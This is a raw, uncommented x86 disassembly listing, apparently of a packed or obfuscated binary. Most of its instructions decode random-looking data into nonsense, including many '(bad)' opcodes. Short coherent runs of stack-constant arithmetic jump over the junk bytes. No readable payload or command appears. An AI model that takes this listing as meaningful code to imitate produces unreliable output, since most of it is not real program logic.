  421c0f:	push   edx
  421c10:	lds    edx,FWORD PTR [ebx+0x12]
  421c13:	push   es
  421c14:	xchg   edi,eax
  421c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c16:	mov    eax,0x24842963
  421c1b:	(bad)  
  421c1c:	mov    edi,0xf686e87b
  421c21:	or     edx,0x33
  421c24:	mov    BYTE PTR [ebp+0x70],ch
  421c27:	std    
  421c28:	ret    
  421c29:	xor    BYTE PTR [ecx+ecx*8-0x4ca06c7c],dl
  421c30:	mov    ebp,0x48725b62
  421c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c36:	xchg   esi,eax
  421c37:	out    dx,eax
  421c38:	push   ebp
  421c39:	outs   dx,DWORD PTR ds:[esi]
  421c3a:	mov    ch,0x48
  421c3c:	ja     0x421bdd
  421c3e:	aad    0x9b
  421c40:	mov    bh,0x61
  421c42:	mov    esi,DWORD PTR [ecx-0x78]
  421c45:	lahf   
  421c46:	mov    eax,DWORD PTR [eax-0x23d149f]
  421c4c:	pop    ecx
  421c4d:	adc    ebx,DWORD PTR [edx+0x14ad3d74]
  421c53:	and    al,0x90
  421c55:	in     al,0x0
  421c57:	cmp    DWORD PTR [edx-0x78],ecx
  421c5a:	dec    ebx
  421c5b:	js     0x421cd6
  421c5d:	xor    eax,DWORD PTR ds:0x6d5dc06a
  421c63:	div    edi
  421c65:	push   esi
  421c66:	push   0x26
  421c68:	push   ebx
  421c69:	jecxz  0x421c66
  421c6b:	or     eax,0x8ef3b3e3
  421c70:	add    al,0x3a
  421c72:	cld    
  421c73:	add    BYTE PTR [ecx],dh
  421c75:	(bad)
  421c7a:	ins    DWORD PTR es:[edi],dx
  421c7b:	xchg   ebx,eax
  421c7c:	mov    ds:0x656f1b33,eax
  421c81:	push   ebx
  421c82:	jp     0x421c05
  421c84:	push   cs
  421c85:	mov    BYTE PTR [esi],dl
  421c87:	jne    0x421cb1
  421c89:	test   DWORD PTR [ebx+0x6eb27309],ebx
  421c8f:	sbb    esp,eax
  421c91:	call   0x737f:0xa617bced
  421c98:	cmp    eax,0xdd0691e1
  421c9d:	inc    ecx
  421c9e:	mov    dh,0xd5
  421ca0:	cdq    
  421ca1:	mov    cl,0x11
  421ca3:	(bad)  
  421ca4:	out    dx,al
  421ca5:	fidiv  WORD PTR [ebp-0xd]
  421ca8:	mov    esi,ds
  421caa:	push   ss
  421cab:	adc    edi,ebp
  421cad:	in     eax,dx
  421cae:	retf   0x1951
  421cb1:	mov    esi,0x82d181a6
  421cb6:	mov    ebx,0x79014402
  421cbb:	pop    eax
  421cbc:	sti    
  421cbd:	push   ds
  421cbe:	cmp    DWORD PTR [ebp-0x30],eax
  421cc1:	jbe    0x4239ff
  421cc7:	add    eax,DWORD PTR [ebp-0x1c]
  421cca:	mov    DWORD PTR [ebp-0x34],eax
  421ccd:	mov    al,BYTE PTR [eax]
  421ccf:	mov    DWORD PTR [ebp-0xc],0x3b78
  421cd6:	jmp    0x421da4
  421cdb:	shl    DWORD PTR [esi-0x3e],cl
  421cde:	(bad)  
  421cdf:	out    0xfe,eax
  421ce1:	(bad)  
  421ce2:	jg     0x421d31
  421ce4:	cmp    DWORD PTR [esi-0x22],eax
  421ce7:	and    BYTE PTR ds:0x8be4cd81,al
  421ced:	add    DWORD PTR [eax],eax
  421cef:	mov    cl,0x0
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	pop    ds
  421cf4:	es xor al,0x0
  421cf7:	enter  0x1a74,0x20
  421cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cfc:	and    bh,BYTE PTR [ecx]
  421cfe:	xchg   BYTE PTR es:[di-0x147e],dh
  421d04:	call   0x2ca9:0xd739eb97
  421d0b:	xchg   ebp,eax
  421d0c:	fwait
  421d0d:	aam    0xbe
  421d0f:	mov    bh,0x9c
  421d11:	(bad)  
  421d13:	jo     0x421d8d
  421d15:	jmp    0xfdad5bed
  421d1a:	cmp    bl,bh
  421d1c:	out    dx,eax
  421d1d:	or     dl,BYTE PTR [edi-0x5b]
  421d20:	sahf   
  421d21:	mov    eax,0x641329e4
  421d26:	out    dx,al
  421d27:	xchg   edx,eax
  421d28:	push   esi
  421d29:	mov    ds:0xd7af728d,al
  421d2e:	jp     0x421d48
  421d30:	jno    0x421d7b
  421d32:	and    BYTE PTR [eax],dl
  421d34:	fdivrp st(2),st
  421d36:	jl     0x421cf6
  421d38:	scas   eax,DWORD PTR es:[edi]
  421d39:	jb     0x421d1e
  421d3b:	jb     0x421d10
  421d3d:	popa   
  421d3e:	jmp    0x1d605069
  421d43:	jg     0x421d31
  421d45:	mov    bh,0x46
  421d47:	push   esi
  421d48:	and    ebx,DWORD PTR [edx+0x68]
  421d4b:	mov    eax,0x419c3a44
  421d50:	sub    edx,esp
  421d52:	or     eax,0x6514d62f
  421d57:	adc    al,BYTE PTR [edx-0x7c]
  421d5a:	(bad)  
  421d5b:	outs   dx,DWORD PTR ds:[esi]
  421d5c:	ins    BYTE PTR es:[edi],dx
  421d5d:	and    al,0xb0
  421d5f:	inc    edi
  421d60:	mov    al,0x46
  421d62:	popf   
  421d63:	xor    BYTE PTR [edi],dh
  421d65:	or     edx,DWORD PTR [edx]
  421d67:	xor    BYTE PTR ds:[ecx-0x18],dl
  421d6b:	lods   eax,DWORD PTR ds:[esi]
  421d6c:	pop    ss
  421d6d:	cmp    DWORD PTR [edx-0x69],0xffffff87
  421d71:	(bad)  
  421d72:	jmp    0x7f06:0x9c6939a5
  421d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d7a:	in     eax,dx
  421d7b:	loopne 0x421d8c
  421d7d:	jmp    0x6b943de6
  421d82:	cmp    DWORD PTR [esi-0xd],esp
  421d85:	inc    ebx
  421d86:	jecxz  0x421dc8
  421d88:	mov    eax,ds:0x61c2c398
  421d8d:	mov    ch,BYTE PTR [ecx-0x54aef779]
  421d93:	sub    BYTE PTR [edi+0xa5f8a61],dl
  421d99:	xor    al,0xb
  421d9b:	push   0x25d6a28b
  421da0:	sbb    BYTE PTR [ecx+0x458854d8],bh
  421da6:	inc    edi
  421da8:	inc    ebp
  421da9:	clc    
  421daa:	dec    ebx
  421dab:	or     al,BYTE PTR [eax]
  421dad:	add    cl,ch
  421daf:	leave  
  421db0:	add    BYTE PTR [eax],al
  421db2:	add    al,bh
  421db4:	fs mov bl,0xa8
  421db7:	mov    edi,0x374fbff
  421dbc:	fldenv [ebp-0x35404099]
  421dc2:	jo     0x421d59
  421dc4:	mov    WORD PTR [ecx],es
  421dc6:	add    BYTE PTR [ecx+0x36000000],dh
  421dcc:	std    
  421dcd:	ins    BYTE PTR es:[edi],dx
  421dce:	imul   DWORD PTR [edi-0x1b]
  421dd1:	je     0x57879d6c
  421dd7:	test   dl,ah
  421dd9:	inc    edi
  421dda:	dec    ebx
  421ddb:	adc    al,0x50
  421ddd:	push   edi
  421dde:	mov    ch,0xd
  421de0:	mov    esp,DWORD PTR [edi+0x67295f09]
  421de6:	and    eax,0xfa508567
  421deb:	outs   dx,BYTE PTR ds:[esi]
  421dec:	dec    esi
  421ded:	add    BYTE PTR [ebp-0x37e88948],dl
  421df3:	shl    BYTE PTR [edi],1
  421df5:	cmc    
  421df6:	out    0x79,al
  421df8:	jb     0x421e1b
  421dfa:	lock xor BYTE PTR [ecx],ah
  421dfd:	mov    ax,0x146e
  421e01:	call   0x60cc:0x1a6d7c31
  421e08:	and    ebp,DWORD PTR [ebx-0x42]
  421e0b:	cs inc edi
  421e0d:	adc    DWORD PTR [ebp-0x5c8854a6],0xcbbf0aac
  421e17:	jge    0x421e0a
  421e19:	sahf   
  421e1a:	test   DWORD PTR [edi+eiz*2-0x466e7211],ebx
  421e21:	pop    ecx
  421e22:	jp     0x421e68
  421e24:	add    ebp,DWORD PTR [ebp-0x12]
  421e27:	inc    edi
  421e28:	rcr    BYTE PTR [ecx+0x67],1
  421e2b:	fnstenv [ecx+0x19]
  421e2e:	xor    esp,DWORD PTR [eax]
  421e30:	fcmovnb st,st(5)
  421e32:	lods   eax,DWORD PTR ds:[esi]
  421e33:	int3   
  421e34:	jbe    0x421dd0
  421e36:	push   eax
  421e37:	outs   dx,BYTE PTR ds:[esi]
  421e38:	sub    al,0xb
  421e3a:	imul   esp,DWORD PTR cs:[esi],0x1c
  421e3e:	or     BYTE PTR [ebx],ah
  421e40:	outs   dx,DWORD PTR ds:[esi]
  421e41:	xchg   ebp,eax
  421e42:	sub    esp,DWORD PTR ds:0x49b414be
  421e48:	(bad)  
  421e49:	push   esp
  421e4a:	mov    ds:0x71330cae,eax
  421e4f:	add    eax,0x45c64d6b
  421e54:	jg     0x421de1
  421e56:	sub    DWORD PTR [eax],ebp
  421e58:	(bad)  
  421e59:	jmp    0x6f7995e7
  421e5e:	push   ecx
  421e5f:	or     esi,edi
  421e61:	jmp    0xd872db6f
  421e66:	nop
  421e67:	add    ch,al
  421e69:	lods   eax,DWORD PTR ds:[esi]
  421e6a:	sub    eax,0x62ff1919
  421e6f:	hlt    
  421e70:	push   ds
  421e71:	test   al,0x5c
  421e73:	push   edi
  421e74:	lea    ebx,[edx+0x67efced4]
  421e7a:	mov    dl,0x69
  421e7c:	mov    eax,DWORD PTR [ebp-0x8]
  421e7f:	mov    edx,DWORD PTR [ebp-0xc]
  421e82:	jmp    0x421f50
  421e87:	inc    eax
  421e88:	push   ebp
  421e89:	or     al,0x13
  421e8b:	sbb    eax,0x8a575f5b
  421e90:	std    
  421e91:	adc    eax,0x9102f9f
  421e96:	xor    eax,DWORD PTR [esi-0x73]
  421e99:	add    DWORD PTR [eax],eax
  421e9b:	mov    cl,0x0
  421e9d:	add    BYTE PTR [eax],al
  421e9f:	push   ds
  421ea0:	stos   BYTE PTR es:[edi],al
  421ea1:	fld    DWORD PTR [edi+0x7c48ab04]
  421ea7:	ins    BYTE PTR es:[edi],dx
  421ea8:	out    0x5e,al
  421eaa:	sbb    DWORD PTR [ebx+0x19],esp
  421ead:	lods   eax,DWORD PTR ds:[esi]
  421eae:	punpckhwd mm1,QWORD PTR [ebx]
  421eb1:	aas    
  421eb2:	dec    al
  421eb4:	mov    esi,ebx
  421eb6:	inc    esi
  421eb7:	jecxz  0x421e67
  421eb9:	mov    cl,0xc4
  421ebb:	and    dl,BYTE PTR [edx+eiz*1-0x39]
  421ebf:	mov    ebx,0xa363480c
  421ec4:	dec    esp
  421ec5:	dec    ebx
  421ec6:	dec    ecx
  421ec7:	repz sub DWORD PTR [ebx-0x1c],ebp
  421ecb:	jbe    0x421f23
  421ecd:	pop    esi
  421ece:	sbb    eax,0x1dec3767
  421ed3:	cmp    al,BYTE PTR ds:0xf63ca57d
  421ed9:	inc    ecx
  421eda:	jns    0x421e99
  421edc:	stc    
  421edd:	lods   al,BYTE PTR ds:[esi]
  421ede:	call   0x8de9ec8c
  421ee3:	cli    
  421ee4:	and    BYTE PTR [edi+esi*8-0x75fecf7c],bl
  421eeb:	das    
  421eec:	and    BYTE PTR [esi-0x5e],dl
  421eef:	in     al,dx
  421ef0:	xchg   ecx,eax
  421ef1:	xchg   ch,bh
  421ef3:	outs   dx,BYTE PTR ds:[esi]
  421ef4:	retf   
  421ef5:	adc    al,0x2a
  421ef7:	dec    esp
  421ef8:	test   DWORD PTR [ebx+0x6f],edx
  421efb:	retf   
  421efc:	adc    ah,BYTE PTR [edx-0x53]
  421eff:	scas   eax,DWORD PTR es:[edi]
  421f00:	cmp    BYTE PTR [eax],0xdc
  421f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f04:	mov    ebp,0x65a45eb4
  421f09:	jecxz  0x421eb5
  421f0b:	jbe    0x421f10
  421f0d:	push   0xffffffb1
  421f0f:	iret   
  421f10:	in     eax,dx
  421f11:	es push edx
  421f13:	ret    
  421f14:	in     eax,0x2d
  421f16:	jmp    0x421ea0
  421f18:	mov    ds:0x6574b0fa,al
  421f1d:	test   BYTE PTR [ecx-0x74],0x3f
  421f21:	in     eax,dx
  421f22:	adc    al,dl
  421f24:	xchg   edx,eax
  421f25:	enter  0x1b01,0x7a
  421f29:	ret    0x28ea
  421f2c:	or     BYTE PTR [edx+0x51],al
  421f2f:	cmp    bh,BYTE PTR [ecx]
  421f31:	and    BYTE PTR [ecx-0x23],ah
  421f34:	and    eax,0x623d8d45
  421f39:	mov    esp,0xbbfc2aa6
  421f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f3f:	enter  0x9a18,0xfd
  421f43:	and    eax,0x21ffcec2
  421f48:	pop    esp
  421f49:	nop
  421f4a:	inc    eax
  421f4b:	ret    0xbe46
  421f4e:	cs mov esi,0x6010d
  421f54:	add    BYTE PTR ds:0xffffe0ef,dh
  421f5a:	and    eax,edx
  421f5c:	jmp    0x42202a
  421f61:	add    DWORD PTR [esi-0x39],ecx
  421f64:	xchg   esi,eax
  421f65:	iret   
  421f66:	lahf   
  421f67:	push   ecx
  421f68:	fbstp  TBYTE PTR [ebx+eax*2-0x56]
  421f6c:	or     eax,0x3f9cddd5
  421f71:	test   DWORD PTR [ebp+0xb10001],0xb8150000
  421f7b:	sub    ebx,esp
  421f7d:	sbb    BYTE PTR [eax*8-0x14437726],bh
  421f84:	stos   DWORD PTR es:[edi],eax
  421f85:	jae    0x421f87
  421f87:	inc    ecx
  421f88:	sar    BYTE PTR [edi+0x17],0xf3
  421f8c:	push   esp
  421f8d:	fnsave [ecx]
  421f8f:	pop    ecx
  421f90:	pop    ds
  421f91:	pop    edx
  421f92:	jno    0x421fd8
  421f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f95:	pop    ebp
  421f96:	mov    eax,ds:0x9ca4cbd1
  421f9b:	push   ss
  421f9c:	xor    al,0x1e
  421f9e:	daa    
  421f9f:	es inc edx
  421fa1:	daa    
  421fa2:	push   esi
  421fa3:	lds    esp,FWORD PTR [esi-0x16]
  421fa6:	dec    esp
  421fa7:	jbe    0x422019
  421fa9:	fcom   st(1)
  421fab:	sbb    ch,ah
  421fad:	xchg   BYTE PTR [edx-0x4d10c733],ch
  421fb3:	fiadd  WORD PTR [edx+edi*4+0x4d]
  421fb7:	xor    ax,0xdf26
  421fbb:	xlat   BYTE PTR ds:[ebx]
  421fbc:	fcmove st,st(3)
  421fbe:	mov    esp,0xb93f9333
  421fc3:	(bad)  
  421fc5:	je     0x421fb0
  421fc7:	je     0x421fad
  421fc9:	add    DWORD PTR [ecx],0x2c3f46b6
  421fcf:	push   ebx
  421fd0:	ror    DWORD PTR [ebp-0x46cb3d53],0xca
  421fd7:	pop    ecx
  421fd8:	xor    BYTE PTR [ebx+0x1d50dc74],0xa2
  421fdf:	dec    ebx
  421fe0:	pop    esp
  421fe1:	push   ebp
  421fe2:	loop   0x422012
  421fe4:	retf   
  421fe5:	jbe    0x42202c
  421fe7:	aam    0x98
  421fe9:	js     0x422000
  421feb:	aaa    
  421fec:	(bad)  
  421fed:	sub    DWORD PTR [ecx],ebp
  421fef:	pusha  
  421ff0:	jne    0x422030
  421ff2:	dec    eax
  421ff3:	and    eax,0x45332687
  421ff8:	cmp    ch,BYTE PTR [eax]
  421ffa:	ins    BYTE PTR es:[edi],dx
  421ffb:	jl     0x421f7e
  421ffd:	outs   dx,BYTE PTR ds:[esi]
  421ffe:	adc    eax,0x82cde526
  422003:	and    DWORD PTR [esi+0x19e41fe7],ebp
  422009:	pop    ds
  42200a:	sbb    eax,0xd24534d8
  42200f:	add    ecx,DWORD PTR [esi+esi*2+0x31096789]
  422016:	js     0x422057
  422018:	addr16 push ecx
  42201a:	outs   dx,BYTE PTR ds:[esi]
  42201b:	pop    ebx
  42201c:	fwait
  42201d:	jmp    0xc1e37352
  422022:	dec    ebp
  422023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422024:	xchg   BYTE PTR [eax],dl
  422026:	dec    esi
  422027:	sub    BYTE PTR [edi+0x5f192567],ch
  42202d:	add    BYTE PTR [eax],al
  42202f:	mov    DWORD PTR [ebp-0x18],eax
  422032:	mov    DWORD PTR [ebp-0xc],0x1
  422039:	mov    DWORD PTR [ebp-0x8],0x47ff
  422040:	jmp    0x42210e
  422045:	sbb    BYTE PTR [ebp+ebx*4-0x1c],0xdf
  42204a:	in     eax,0xfb
  42204c:	jle    0x4220ae
  42204e:	jmp    0xc378:0x7b559f47
  422055:	test   al,0x8e
  422057:	add    DWORD PTR [eax],eax
  422059:	mov    cl,0x0
  42205b:	add    BYTE PTR [eax],al
  42205d:	pop    edi
  42205e:	aam    0xfe
  422060:	sub    esp,0x8147631e
  422066:	int    0xf0
  422068:	jbe    0x422084
  42206a:	add    ch,BYTE PTR [eax-0x2411141b]
  422070:	cmp    eax,0xa27b43fb
  422075:	test   DWORD PTR [eax-0x51fc0ded],eax
  42207b:	call   0xb45745ee
  422080:	retf   0x1c02
  422083:	je     0x42205f
  422085:	mov    ecx,0x76e7c494
  42208a:	in     al,0xe8
  42208c:	xor    eax,0x8497ad46
  422091:	outs   dx,DWORD PTR ds:[esi]
  422092:	mov    esi,0xb7ec564
  422097:	cmp    edi,DWORD PTR [ecx+0x34]
  42209a:	cdq    
  42209b:	jl     0x422080
  42209d:	mov    edi,0xfc8360bf
  4220a2:	ins    BYTE PTR es:[edi],dx
  4220a3:	mov    al,0xd9
  4220a5:	js     0x422117
  4220a7:	lds    edx,FWORD PTR [edi+0x76]
  4220aa:	pop    ds
  4220ab:	loop   0x4220ff
  4220ad:	pop    ecx
  4220ae:	setns  bh
  4220b1:	sbb    eax,0x3363e25a
  4220b6:	jl     0x4220e4
  4220b8:	push   edi
  4220b9:	pop    esi
  4220ba:	das    
  4220bb:	and    eax,0x1859311e
  4220c0:	icebp  
  4220c1:	into   
  4220c2:	add    al,0x38
  4220c4:	and    eax,0x69595e55
  4220c9:	mov    al,ds:0xa50da23
  4220ce:	sub    eax,0x737b5155
  4220d3:	ja     0x422076
  4220d5:	rcl    DWORD PTR [edi+ebx*2],cl
  4220d8:	or     DWORD PTR [ecx+eax*2],0x7e
  4220dc:	adc    DWORD PTR [ecx],edx
  4220de:	inc    ebx
  4220df:	fimul  WORD PTR [eax+0x56]
  4220e2:	scas   eax,DWORD PTR es:[edi]
  4220e3:	push   ebx
  4220e4:	inc    ecx
  4220e5:	scas   al,BYTE PTR es:[edi]
  4220e6:	clc    
  4220e7:	sub    ch,al
  4220e9:	jge    0x422158
  4220eb:	(bad)  
  4220ed:	mov    bh,BYTE PTR [esi-0x5d]
  4220f0:	dec    esi
  4220f1:	scas   al,BYTE PTR es:[edi]
  4220f2:	and    cl,0x18
  4220f5:	icebp  
  4220f6:	jns    0x422111
  4220f8:	inc    edx
  4220f9:	or     al,BYTE PTR [ebx]
  4220fb:	pop    edx
  4220fc:	mov    ebx,0x50494284
  422101:	ins    DWORD PTR es:[edi],dx
  422102:	mov    eax,ds:0x40894c11
  422107:	fsubr  DWORD PTR [ebx+0x5]
  42210a:	stos   DWORD PTR es:[edi],eax
  42210b:	jecxz  0x42217c
  42210d:	sbb    BYTE PTR [ebx+0x5d8bf845],cl
  422113:	hlt    
  422114:	and    eax,edi
  422116:	jmp    0x4221e4
  42211b:	lds    ebx,FWORD PTR ds:[esi]
  42211e:	inc    edx
  42211f:	(bad)  
  422120:	fstp   TBYTE PTR [esi-0x3]
  422123:	aas    
  422124:	sbb    DWORD PTR [edi-0x61],edi
  422127:	and    al,0x7
  422129:	icebp  
  42212a:	addr16 pop ecx
  42212c:	pop    DWORD PTR [ecx]
  42212e:	add    BYTE PTR [ecx-0x49000000],dh
  422134:	lea    esp,[edi+0x4f]
  422137:	loopne 0x42212c
  422139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42213a:	lea    esi,[edx]
  42213c:	into   
  42213d:	addps  xmm4,XMMWORD PTR [ebx+0x4f72d003]
  422144:	and    al,0x48
  422146:	sbb    edi,DWORD PTR [ebx+0x22]
  422149:	pushf  
  42214a:	jp     0x42217c
  42214c:	nop
  42214d:	add    DWORD PTR [edi+0x15c7b41f],ebx
  422153:	mov    ecx,0x377dd57d
  422158:	sbb    dh,BYTE PTR [ebx-0x44]
  42215b:	or     BYTE PTR [edx-0x43],0x5d
  42215f:	mov    ch,0xb7
  422161:	sbb    al,0xbf
  422163:	mov    dl,0xd0
  422165:	xchg   DWORD PTR ds:0xcb2d16a2,ebx
  42216b:	add    al,0x61
  42216d:	sub    esi,DWORD PTR [ebp+0x494c3a4]
  422173:	(bad)
  422176:	icebp  
  422177:	sbb    edx,eax
  422179:	out    0x13,al
  42217b:	sbb    eax,0x45d20942
  422180:	loop   0x4221e9
  422182:	dec    esi
  422183:	pusha  
  422184:	nop    DWORD PTR [ecx+0x7f]
  422188:	mov    ch,BYTE PTR [edi+0x18]
  42218b:	call   edx
  42218d:	dec    eax
  42218e:	mov    ebx,0xe75d8145
  422193:	out    0x21,eax
  422195:	sahf   
  422196:	int    0x2c
  422198:	xchg   ecx,eax
  422199:	sbb    ebp,DWORD PTR [eax+0x70]
  42219c:	rcr    BYTE PTR [edi],0x2c
  42219f:	adc    al,0xa7
  4221a1:	into   
  4221a2:	dec    ecx
  4221a3:	sbb    DWORD PTR es:[ebx+0x4],0x75
  4221a8:	fisubr WORD PTR [esi]
  4221aa:	ja     0x4221bd
  4221ac:	push   ecx
  4221ad:	test   eax,0xa5dd220f
  4221b2:	or     cl,dl
  4221b4:	sub    al,0x79
  4221b6:	call   0x5b010d5b
  4221bb:	sub    eax,0x3840b6cb
  4221c0:	mov    al,ds:0x6eab62c5
  4221c5:	in     al,0x44
  4221c7:	mov    dl,0x7b
  4221c9:	in     eax,0x81
  4221cb:	push   edi
  4221cc:	retf   0x1b45
  4221cf:	push   ebp
  4221d0:	(bad)  
  4221d1:	mov    dh,0xdf
  4221d3:	ins    BYTE PTR es:[edi],dx
  4221d4:	push   es
  4221d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221d6:	mov    al,ds:0x8725ae3d
  4221db:	call   0xef90:0x92cd8ecb
  4221e2:	test   esp,0xc133d233
  4221e8:	div    ebx
  4221ea:	mov    edx,DWORD PTR [ebp-0x18]
  4221ed:	cmp    eax,edx
  4221ef:	jae    0x423513
  4221f5:	mov    DWORD PTR [ebp-0x24],0x4de2
  4221fc:	jmp    0x4222ca
  422201:	pop    edx
  422202:	js     0x42225a
  422204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422205:	jbe    0x4221b6
  422207:	sti    
  422208:	(bad)  
  422209:	mov    eax,0xb40d02ed
  42220e:	pop    eax
  42220f:	dec    esi
  422210:	imul   ecx,DWORD PTR [edx],0xb1000190
  422216:	add    BYTE PTR [eax],al
  422218:	add    BYTE PTR [eax+0x13],dl
  42221b:	jne    0x422200
  42221d:	mov    ds,WORD PTR [esi]
  42221f:	rcr    DWORD PTR [edi-0x4e],cl
  422222:	and    al,0xe5
  422224:	dec    edx
  422225:	lock sbb DWORD PTR es:[eax],ebp
  422229:	sar    BYTE PTR [ebp-0x33],0xaa
  42222d:	mov    dh,0xa
  42222f:	(bad)  
  422230:	std    
  422231:	hlt    
  422232:	push   esp
  422233:	xor    al,dl
  422235:	xchg   ecx,eax
  422236:	fwait
  422237:	add    eax,0xa2c57b0d
  42223c:	cs dec esi
  42223e:	push   esi
  42223f:	test   BYTE PTR [edi],ah
  422241:	(bad)  
  422242:	mov    DWORD PTR [ebx-0x55],ebp
  422245:	xor    BYTE PTR [esi-0x51],ah
  422248:	ja     0x422282
  42224a:	xchg   esi,eax
  42224b:	push   0xc6ec44fd
  422250:	leave  
  422251:	stc    
  422252:	fist   DWORD PTR [esi+0x7fe7a306]
  422258:	mov    edx,DWORD PTR [edx]
  42225a:	mov    ebx,0x3ea36815
  42225f:	add    ch,dh
  422261:	jae    0x4221f2
  422263:	jl     0x422293
  422265:	mov    edx,0xf931d9e1
  42226a:	push   cs
  42226b:	push   0xffffffb2
  42226d:	fs pop esp
  42226f:	test   BYTE PTR [ecx-0x3a55b870],bh
  422275:	add    esi,DWORD PTR [eax]
  422277:	xchg   DWORD PTR [edi],edx
  422279:	je     0x422249
  42227b:	jbe    0x4221ff
  42227d:	and    eax,0x9b4744df
  422282:	xlat   BYTE PTR ds:[ebx]
  422283:	adc    al,0xfc
  422285:	stos   BYTE PTR es:[edi],al
  422286:	xchg   esi,eax
  422287:	xlat   BYTE PTR ds:[ebx]
  422288:	shl    BYTE PTR [eax+0x4],cl
  42228b:	idiv   BYTE PTR [esi+0x40]
  42228e:	ss add eax,0x6b22b051
  422294:	cmp    edi,DWORD PTR [ebx+0x223de9c4]
  42229a:	jle    0x422226
  42229c:	popf   
  42229d:	mov    eax,ds:0xe16a1d43
  4222a2:	fdivr  st,st(4)
  4222a4:	xchg   edi,eax
  4222a5:	dec    edx
  4222a6:	das    
  4222a7:	rcl    BYTE PTR [ebx],cl
  4222a9:	jle    0x42222c
  4222ab:	xor    al,0x53
  4222ad:	cmp    DWORD PTR [esi+0x6655311],0xffffffcc
  4222b4:	fild   QWORD PTR [ebp+0x7b]
  4222b7:	pop    esi
  4222b8:	pop    esp
  4222b9:	inc    eax
  4222ba:	xor    al,0xe5
  4222bc:	mov    esp,0xd90c2e41
  4222c1:	adc    eax,0x77ab4a0d
  4222c6:	std    
  4222c7:	ds xchg ebp,eax
  4222c9:	dec    edi
  4222ca:	mov    DWORD PTR [ebp-0x14],0x3726
  4222d1:	mov    DWORD PTR [ebp-0x18],0x2e39
  4222d8:	mov    DWORD PTR [ebp-0xc],0x7c06
  4222df:	mov    DWORD PTR [ebp-0x8],0x6909
  4222e6:	mov    eax,DWORD PTR [ebp-0x8]
  4222e9:	mov    edx,DWORD PTR [ebp-0xc]
  4222ec:	sub    edx,eax
  4222ee:	mov    eax,DWORD PTR [ebp-0x18]
  4222f1:	xor    edx,eax
  4222f3:	mov    eax,DWORD PTR [ebp-0x14]
  4222f6:	sub    edx,0x2897
  4222fc:	imul   edx,eax
  4222ff:	mov    eax,DWORD PTR [ebp-0x24]
  422302:	and    edx,eax
  422304:	mov    DWORD PTR [ebp-0x24],edx
  422307:	jmp    0x4223d5
  42230c:	mov    gs,WORD PTR [ebx]
  42230e:	mov    ds:0xdffea776,eax
  422313:	sti    
  422314:	test   al,0xc9
  422316:	out    dx,al
  422317:	int    0x1a
  422319:	lds    edi,FWORD PTR [ebp+0x190bb9f]
  42231f:	add    BYTE PTR [ecx+0x51000000],dh
  422325:	js     0x42234f
  422327:	mov    esp,0xa6dbbb
  42232c:	inc    edi
  42232d:	clc    
  42232e:	cmp    ebx,DWORD PTR ds:0x8f8a4870
  422334:	jge    0x422332
  422336:	add    DWORD PTR [ebp-0x12e2808d],ebp
  42233c:	out    dx,eax
  42233d:	sbb    eax,0xb34808a
  422342:	dec    edx
  422343:	dec    ebp
  422344:	lods   al,BYTE PTR ds:[esi]
  422345:	sub    BYTE PTR [ebp+0x46],ch
  422348:	ja     0x42233d
  42234a:	pop    ecx
  42234b:	mov    ah,0x11
  42234d:	sub    al,0xf6
  42234f:	xchg   esp,eax
  422350:	jae    0x4223a3
  422352:	jl     0x4222da
  422354:	test   DWORD PTR [edi+0x7d],eax
  422357:	scas   eax,DWORD PTR es:[edi]
  422358:	fstp   QWORD PTR [edx-0x2c]
  42235b:	cdq    
  42235c:	mov    dl,0x29
  42235e:	mov    bh,0xc
  422360:	mov    bh,0xa2
  422362:	aas    
  422363:	adc    edi,DWORD PTR [ebx+ebp*1]
  422366:	imul   ebx,DWORD PTR [ebp+eax*4+0x78],0x25456b8b
  42236e:	jno    0x42235b
  422370:	xchg   ecx,eax
  422371:	aam    0x6b
  422373:	inc    ebp
  422374:	pop    ecx
  422375:	cmp    BYTE PTR ds:0x3cea81c1,dh
  42237b:	test   cl,bh
  42237d:	call   0xa2030d9f
  422382:	fwait
  422383:	(bad)  
  422384:	sti    
  422385:	and    ch,cl
  422387:	pop    esi
  422388:	push   0x684bc094
  42238d:	xor    dl,ch
  42238f:	mov    bl,0xde
  422391:	lea    edx,[edi+0x626c8bf9]
  422397:	bound  eax,QWORD PTR [edi-0x36]
  42239a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42239b:	sub    BYTE PTR [esp+eax*4+0xe],bl
  42239f:	xor    DWORD PTR [ebp+0x1a9b34d3],eax
  4223a5:	pop    edx
  4223a6:	(bad)  
  4223a7:	xor    DWORD PTR [ebp+0x7b32eafa],esp
  4223ad:	cmp    BYTE PTR ds:0x393535b5,cl
  4223b3:	mov    ecx,0xb3dfa8a0
  4223b8:	inc    esi
  4223b9:	sbb    BYTE PTR [ebx+0x4fb36a6],ah
  4223bf:	pop    es
  4223c0:	ret    
  4223c1:	mov    ebx,0x20e37508
  4223c6:	sub    al,0xbc
  4223c8:	jne    0x4223d4
  4223ca:	aad    0x4f
  4223cc:	aaa    
  4223cd:	and    dh,dl
  4223cf:	sub    esi,DWORD PTR [edi+0x463129c9]
  4223d5:	mov    DWORD PTR [ebp-0x8],0x3b78
  4223dc:	mov    DWORD PTR [ebp-0x24],0xa4b
  4223e3:	mov    eax,DWORD PTR [ebp-0x24]
  4223e6:	jmp    0x4224b4
  4223eb:	mov    dh,0xfb
  4223ed:	ss mov edi,0xfbbfff7f
  4223f3:	mov    ds:0xba1599b,al
  4223f8:	sbb    al,0xe4
  4223fa:	je     0x422468
  4223fc:	xchg   ecx,eax
  4223fd:	add    DWORD PTR [eax],eax
  4223ff:	mov    cl,0x0
  422401:	add    BYTE PTR [eax],al
  422403:	push   0x350e18ee
  422408:	out    0x14,al
  42240a:	or     eax,0x2a3a91f9
  42240f:	pop    ebx
  422410:	inc    edi
  422411:	sub    DWORD PTR [ebx+0x15f0c1d9],esi
